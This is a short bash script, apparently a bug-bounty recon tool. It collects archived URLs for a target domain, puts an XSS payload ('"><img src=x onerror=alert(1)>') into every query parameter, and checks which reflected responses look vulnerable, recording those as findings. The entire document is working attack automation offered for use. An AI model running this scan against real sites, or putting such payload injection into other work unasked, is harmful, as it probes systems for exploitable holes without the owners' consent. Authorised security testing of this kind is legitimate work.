#!/bin/bash

echo "[+] Running waybackurls"
waybackurls $1 > archive_links
echo "[+] Running gau"
gau $1 >> archive_links
sort -u archive_links -o archive_links
cat archive_links | uro | tee -a archive_links_uro
echo "[+] Starting qsreplace and freq"
cat archive_links_uro | grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | tee -a freq_output | grep -iv "Not Vulnerable" | tee -a freq_xss_findings
echo "[+] Script Execution Ended"
